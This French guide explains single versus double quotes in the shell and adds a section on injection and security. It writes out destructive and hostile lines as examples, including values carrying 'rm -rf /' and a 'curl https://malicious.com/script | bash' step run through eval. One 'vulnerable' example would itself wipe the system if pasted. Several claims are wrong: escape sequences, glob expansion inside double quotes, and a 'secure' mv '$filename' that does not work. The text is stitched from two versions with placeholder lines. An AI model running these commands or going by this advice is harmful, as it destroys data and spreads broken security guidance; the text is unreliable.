# Guide Détaillé des Guillemets dans le Shell

## Guillemets Simples (')

### Comportement Fondamental
Les guillemets simples créent une chaîne littérale où TOUS les caractères perdent leur signification spéciale.

### Règles Détaillées
- Aucune substitution de variable ($VAR ou ${VAR})
- Aucune substitution de commande ($() ou ``)
- Aucune interprétation des caractères d'échappement (\)
- Aucune interprétation des caractères spéciaux (*, ?, [], etc.)
- Aucun traitement des opérateurs de contrôle (&&, ||, ;)

### Exemples Détaillés
```bash
# Variables
VAR="test"
echo '$VAR'         # Affiche: $VAR
echo '${VAR}'       # Affiche: ${VAR}

# Commandes
echo '$(pwd)'       # Affiche: $(pwd)
echo '`date`'       # Affiche: `date`

# Caractères spéciaux
echo '*.txt'        # Affiche: *.txt
echo '$?'           # Affiche: $?
echo '$!'           # Affiche: $!

# Échappements
echo '\n\t'         # Affiche: \n\t
```

## Guillemets Doubles (")

### Comportement Fondamental
Les guillemets doubles permettent certaines substitutions tout en protégeant les espaces et les caractères spéciaux du shell.

### Éléments Interprétés
1. Substitutions de Variables:
   ```bash
   VAR="monde"
   echo "Bonjour $VAR"    # Affiche: Bonjour monde
   echo "Path: $PATH"      # Affiche la valeur de PATH
   ```

2. Substitutions de Commandes:
   ```bash
   echo "Date: $(date)"    # Exécute la commande date
   echo "PWD: `pwd`"       # Ancienne syntaxe, équivalent à $()
   ```

3. Caractères d'Échappement:
   ```bash
   echo "Ligne 1\nLigne 2"  # Nouveau ligne interprété
   echo "Tab\tici"          # Tabulation interprétée
   ```

### Caractères Spéciaux Préservés
- $ (pour variables et commandes)
- ` (pour substitution de commande)
- \ (pour échappement)
- " (délimitation)

## Cas Complexes

### Imbrication des Guillemets
```bash
# Guillemets simples dans doubles
echo "J'aime le shell"     # Ok direct
echo "Il a dit 'Bonjour'"  # Ok direct

# Guillemets doubles dans simples
echo 'Il a dit "Bonjour"'  # Ok direct

# Guillemets doubles dans doubles
echo "Il a dit \"Bonjour\""  # Nécessite échappement

# Guillemets simples dans simples
echo 'L'\''exemple'          # Nécessite fermeture/réouverture
```

### Variables avec Espaces
```bash
fichier="mon fichier.txt"
echo '$fichier'           # Affiche: $fichier
echo "$fichier"           # Affiche: mon fichier.txt
touch "$fichier"          # Crée un fichier avec espaces
```

### Commandes Complexes
```bash
# Avec guillemets simples
find . -name '*.txt'      # Cherche littéralement *.txt

# Avec guillemets doubles
find . -name "*.txt"      # L'astérisque est interprété

# Combinaison
ssh user@host 'echo "$(hostname)"'  # Exécute sur l'hôte distant
```

## Bonnes Pratiques Avancées

# Guide Détaillé des Guillemets dans le Shell

[sections précédentes identiques jusqu'à la section Sécurité]

## Sécurité et Guillemets

#### Protection contre l'Injection de Code
Les guillemets simples neutralisent toute tentative d'injection de code car aucun caractère n'est interprété.

```bash
# Vulnérable (guillemets doubles)
user_input="$(rm -rf /); echo 'Compromis'"
eval "echo $user_input"    # Commande dangereuse exécutée

# Sécurisé (guillemets simples)
user_input='$(rm -rf /); echo "Compromis"'
eval 'echo $user_input'    # Affiché littéralement, pas d'exécution
```

#### Protection des Variables d'Environnement
```bash
# Vulnérable
DB_PASSWORD="$USER;rm -rf /"
echo "Connexion avec $DB_PASSWORD"  # Potentiellement dangereux

# Sécurisé
DB_PASSWORD='$USER;rm -rf /'
echo 'Utilisation du mot de passe: $DB_PASSWORD'  # Sûr
```

#### Sécurisation des Entrées Utilisateur
```bash
# Vulnérable
filename="image.jpg; rm -rf /"
mv "$filename" /uploads/    # Injection possible

# Sécurisé
filename='image.jpg; rm -rf /'
mv '$filename' /uploads/    # Pas d'injection possible
```

### Bonnes Pratiques de Sécurité

1. Variables Sensibles
```bash
# TOUJOURS utiliser des guillemets simples pour:
API_KEY='abc123'
CREDENTIALS='user:pass'
SECRET_TOKEN='xyz789'
```

2. Manipulation de Fichiers
```bash
# Pour les chemins avec variables, utiliser des guillemets doubles
path="/home/$USER/data"
# Pour les chemins fixes, préférer les guillemets simples
path='/var/www/html'
```

3. Commandes SQL
```bash
# Vulnérable
query="SELECT * FROM users WHERE id = $user_input"

# Sécurisé
query='SELECT * FROM users WHERE id = ?'
```

### Cas Particuliers de Sécurité

#### Scripts d'Installation
```bash
# Vulnérable
install_cmd="curl https://malicious.com/script | bash"
eval "$install_cmd"

# Sécurisé
install_cmd='curl https://verified.com/script | bash'
# Validation manuelle nécessaire avant exécution
```

#### Variables de Configuration
```bash
# Configuration sécurisée
APP_ENV='production'
DEBUG_MODE='false'
ALLOWED_HOSTS='localhost,example.com'
```

### Audit de Sécurité
```bash
# Script de vérification des guillemets
audit_quotes() {
    grep -n '".*"' "$1"  # Trouve les guillemets doubles
    grep -n 'eval.*"' "$1"  # Trouve eval avec guillemets doubles
}
```

[reste du document identique]
### Performance
- Les guillemets simples sont plus rapides car aucune interprétation n'est nécessaire
- Utiliser des guillemets simples pour les chaînes statiques
- Réserver les guillemets doubles pour le contenu dynamique

### Débogage
```bash
# Vérifier l'interprétation
set -x  # Active le mode debug
echo '$VAR'
echo "$VAR"
set +x  # Désactive le mode debug
```

### Portabilité
- Les guillemets simples fonctionnent de manière identique dans tous les shells POSIX
- Les guillemets doubles peuvent avoir des variations mineures entre shells
- Préférer les guillemets simples pour les scripts portables